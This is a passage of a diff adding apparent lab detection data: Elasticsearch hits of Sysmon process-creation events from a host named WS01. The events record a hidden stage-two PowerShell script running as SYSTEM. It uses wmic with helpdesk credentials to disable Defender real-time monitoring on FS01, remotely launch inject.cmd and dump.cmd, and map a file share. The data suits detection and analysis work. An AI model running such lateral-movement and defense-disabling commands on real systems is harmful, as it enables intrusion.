+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:06.471\nProcessGuid: {88E52A21-989A-6AE0-CB04-000000002600}\nProcessId: 7424\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create \"powershell.exe -NoProfile -Command Set-MpPreference -DisableRealtimeMonitoring $true\"\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:06.471Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:09Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "created": "2026-10-27T12:27:06.664Z",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMFMrXYC",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "wmic /node:FS01 /user:C0015\\helpdesk /password:*** process where name='svchost.exe' get ProcessId,CommandLine /format:list"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 5832,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-989D-6AE0-CD04-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process where \"name='svchost.exe'\" get ProcessId,CommandLine /format:list\""
+        },
+        "winlog": {
+          "computer_name": "WS01.c0015.lab",
+          "record_id": "1228773",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "event_id": "1",
+          "task": "Process Create (rule: ProcessCreate)",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Windows Command Processor",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:09.578\nProcessGuid: {88E52A21-989D-6AE0-CD04-000000002600}\nProcessId: 5832\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process where \"name='svchost.exe'\" get ProcessId,CommandLine /format:list\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:09.578Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "type": "windows",
+            "family": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:19Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:27:10.676Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMFMrXYU",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create C:\\ProgramData\\inject.cmd"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 2296,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-989D-6AE0-CF04-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create \"C:\\ProgramData\\inject.cmd\"\""
+        },
+        "winlog": {
+          "computer_name": "WS01.c0015.lab",
+          "record_id": "1228791",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Windows Command Processor",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:09.883\nProcessGuid: {88E52A21-989D-6AE0-CF04-000000002600}\nProcessId: 2296\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create \"C:\\ProgramData\\inject.cmd\"\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:09.883Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:19Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:27:10.676Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMFyrcL6",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create C:\\ProgramData\\dump.cmd"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 4664,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-98A6-6AE0-D104-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create \"C:\\ProgramData\\dump.cmd\"\""
+        },
+        "winlog": {
+          "computer_name": "WS01.c0015.lab",
+          "record_id": "1228867",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "event_id": "1",
+          "task": "Process Create (rule: ProcessCreate)",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Windows Command Processor",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "IntegrityLevel": "System",
+            "TerminalSessionId": "0",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "opcode": "Info",
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:18.992\nProcessGuid: {88E52A21-98A6-6AE0-D104-000000002600}\nProcessId: 4664\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"wmic /node:FS01 /user:C0015\\helpdesk /password:*** process call create \"C:\\ProgramData\\dump.cmd\"\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:18.992Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:28Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "kind": "event",
+          "created": "2026-10-27T12:27:20.697Z",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    },
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMFyrsIV",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "type": "filebeat",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\Windows\\system32\\cmd.exe",
+            "/c",
+            "net use \\\\FS01\\Shares /user:C0015\\helpdesk ***"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "imphash": "272245e2988e1e430500b852c4fb5e18",
+            "description": "Windows Command Processor",
+            "original_file_name": "Cmd.Exe",
+            "company": "Microsoft Corporation"
+          },
+          "name": "cmd.exe",
+          "pid": 5412,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 3,
+          "entity_id": "{88E52A21-98AA-6AE0-D304-000000002600}",
+          "hash": {
+            "sha256": "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59"
+          },
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\FS01\\Shares /user:C0015\\helpdesk ***\""
+        },
+        "winlog": {
+          "record_id": "1228894",
+          "computer_name": "WS01.c0015.lab",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "Microsoft Corporation",
+            "Description": "Windows Command Processor",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "IntegrityLevel": "System",
+            "TerminalSessionId": "0",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "10.0.19041.3636 (WinBuild.160101.0800)",
+            "LogonId": "0x3e7"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          },
+          "version": 5
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:22.114\nProcessGuid: {88E52A21-98AA-6AE0-D304-000000002600}\nProcessId: 5412\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"net use \\\\FS01\\Shares /user:C0015\\helpdesk ***\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=265B69033CEA7A9F8214A34CD9B17912909AF46C7A47395DD7BB893A24507E59,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:22.114Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "265b69033cea7a9f8214a34cd9b17912909af46c7a47395dd7bb893a24507e59",
+            "272245e2988e1e430500b852c4fb5e18"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "family": "windows",
+            "type": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:28Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:27:23.701Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
